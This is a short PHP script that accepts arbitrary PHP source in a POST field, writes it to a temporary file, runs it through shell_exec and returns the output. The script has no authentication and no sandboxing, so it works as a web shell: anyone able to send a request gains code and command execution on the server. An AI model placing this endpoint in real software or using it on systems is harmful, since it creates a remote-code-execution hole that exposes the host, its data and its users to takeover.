<?php
if($_SERVER['REQUEST_METHOD']==='POST'){
$code=$_POST['code']??'';
$file=tempnam(sys_get_temp_dir(),'php');
file_put_contents($file,"<?php\n".$code);
$output=shell_exec("php $file 2>&1");
echo htmlspecialchars($output);
unlink($file);
exit;
}
?>
